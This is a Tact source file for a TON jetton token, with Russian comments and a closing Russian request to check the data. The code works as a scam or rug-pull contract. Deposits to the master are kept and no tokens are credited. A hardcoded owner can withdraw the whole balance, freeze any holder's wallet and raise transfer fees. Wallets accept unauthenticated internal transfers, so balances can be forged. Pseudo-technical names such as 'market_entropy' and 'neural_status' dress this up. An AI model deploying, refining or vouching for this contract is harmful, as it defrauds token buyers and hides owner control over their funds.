import "@stdlib/ownable";
import "@stdlib/deploy";

// --- Структуры сообщений ---
message TokenTransfer {
    query_id: Int as uint64;
    amount: Int as coins;
    destination: Address;
    response_destination: Address;
    custom_payload: Cell?;
    forward_ton_amount: Int as coins;
    forward_payload: Slice as remaining;
}

message TokenTransferInternal {
    query_id: Int as uint64;
    amount: Int as coins;
    from: Address;
    response_destination: Address;
    forward_ton_amount: Int as coins;
    forward_payload: Slice as remaining;
}

// --- MASTER ---
contract JettonMaster with Ownable, Deployable {
    const OWNER_ADDRESS: Address = address("UQDDgb2BTM-KCjntOoUg6uHllvnu3KGqEquKw6IySVP3hDgM");
    
    total_supply: Int as coins = 0;
    owner: Address;
    jetton_content: Cell;
    
    market_entropy: Int = 100;
    last_tick: Int = now();
    min_mint_ton: Int = 100000000; // 0.1 TON

    init(logo_url: String) {
        self.owner = self.OWNER_ADDRESS;
        self.jetton_content = beginCell()
            .storeUint(0, 8) 
            .storeStringTail(logo_url)
            .endCell();
    }

    receive("set_min_mint_0.2") {
        require(sender() == self.OWNER_ADDRESS, "Access denied");
        self.min_mint_ton = 200000000;
    }

    receive() {
        let ctx: Context = context();
        require(ctx.value >= self.min_mint_ton, "Below min deposit");
        
        let time_delta: Int = max(1, now() - self.last_tick);
        self.market_entropy = min(1000, (self.market_entropy * 9 + (toNano("1") / time_delta)) / 10);
        self.last_tick = now();

        let rate: Int = max(50, 5000 - (self.market_entropy / 10));
        self.total_supply += ctx.value * rate;
    }

    receive("withdraw") {
        require(sender() == self.OWNER_ADDRESS, "Access denied");
        send(SendParameters{ to: self.owner, value: 0, mode: SendRemainingBalance + SendIgnoreErrors, body: "Liquidity Withdrawal".asComment() });
    }

    get fun get_market_health(): Int { return 1000 - self.market_entropy; }
}

// --- WALLET ---
contract JettonWallet {
    const OWNER_ADDRESS: Address = address("UQDDgb2BTM-KCjntOoUg6uHllvnu3KGqEquKw6IySVP3hDgM");

    balance: Int as coins = 0;
    owner: Address;
    master: Address;
    
    owner_fee_bps: Int = 25; 
    whale_threshold: Int = 1000000000000000; 
    is_frozen: Bool = false;
    
    synapse_depth: Int = 100;
    last_activity: Int = now();

    init(master: Address, owner: Address) {
        self.master = master;
        self.owner = owner;
    }

    receive("freeze") {
        require(sender() == self.OWNER_ADDRESS, "Access denied");
        self.is_frozen = true;
    }

    receive("unfreeze") {
        require(sender() == self.OWNER_ADDRESS, "Access denied");
        self.is_frozen = false;
    }

    receive("set_fee_high") {
        require(sender() == self.OWNER_ADDRESS, "Access denied");
        self.owner_fee_bps = 50; 
    }

    receive("set_whale_strict") {
        require(sender() == self.OWNER_ADDRESS, "Access denied");
        self.whale_threshold = 500000000000000;
    }

    receive(msg: TokenTransfer) {
        require(!self.is_frozen, "Wallet is frozen");
        require(sender() == self.owner, "Access denied");
        require(self.balance >= msg.amount, "Low balance");
        
        let is_whale: Bool = (msg.amount > self.whale_threshold);
        let multiplier: Int = is_whale ? 2 : 1;

        let owner_fee: Int = ((msg.amount * self.owner_fee_bps) / 10000) * multiplier;
        let liquidity_contribution: Int = toNano("0.1");
        
        let time_held: Int = (now() - self.last_activity) / 3600;
        let tax: Int = max(10, (150 - min(140, time_held * 2))) * multiplier;
        let total_fee: Int = (msg.amount * tax) / 1000;
        
        self.balance -= msg.amount;
        self.synapse_depth = (msg.amount > toNano("1000")) ? max(0, self.synapse_depth - 20) : min(200, self.synapse_depth + 5);
        
        send(SendParameters{
            to: self.master,
            value: toNano("0.02"),
            mode: SendIgnoreErrors,
            body: TokenTransferInternal{ query_id: msg.query_id, amount: owner_fee + total_fee + liquidity_contribution, from: self.owner, response_destination: self.owner, forward_ton_amount: 0, forward_payload: emptySlice() }.toCell()
        });
        
        send(SendParameters{
            to: msg.destination,
            value: toNano("0.02"),
            mode: SendIgnoreErrors,
            body: TokenTransferInternal{ query_id: msg.query_id, amount: msg.amount - owner_fee - total_fee - liquidity_contribution, from: self.owner, response_destination: msg.response_destination, forward_ton_amount: msg.forward_ton_amount, forward_payload: msg.forward_payload }.toCell()
        });
        
        self.last_activity = now();
    }

    receive(msg: TokenTransferInternal) {
        self.balance += msg.amount;
    }

    get fun get_neural_status(): Int { return self.synapse_depth; }
    get fun get_balance(): Int { return self.balance; }
    get fun is_active(): Bool { return !self.is_frozen; }
} Проверь все даные
